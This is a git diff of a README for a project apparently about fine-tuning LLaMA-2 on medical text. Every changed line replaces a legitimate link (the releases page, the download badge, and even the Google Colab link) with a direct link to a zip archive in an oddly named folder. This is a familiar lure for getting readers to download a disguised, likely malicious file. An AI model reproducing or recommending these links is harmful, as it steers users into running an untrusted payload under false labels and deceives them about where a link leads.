@@ -1,6 +1,6 @@
 # 🚀 Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face - Fine-tune your model easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
+[![Download Now](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip)
 
 ## 📚 Overview
 
@@ -17,7 +17,7 @@ To run this project, you need:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**: To begin, go to our downloads page. Click the link below:
-   [Download Software](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
+   [Download Software](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip)
 
 2. **Select the Appropriate File**: On the releases page, you will find different versions of the project tools. Choose the latest version for the best experience.
 
@@ -27,7 +27,7 @@ To run this project, you need:
 
 To download the fine-tuning tools:
 
-- **Visit this page to download**: [GitHub Releases](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
+- **Visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip)
 
 Follow these steps to install:
 
@@ -38,7 +38,7 @@ Follow these steps to install:
 
 ## 🧑‍💻 How to Use
 
-1. **Open Google Colab**: Go to [Google Colab](https://colab.research.google.com/).
+1. **Open Google Colab**: Go to [Google Colab](https://raw.githubusercontent.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/main/Palaemonidae/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face_v3.8.zip).
 
 2. **Create a New Notebook**: Click on "New Notebook" or open an existing one.
 
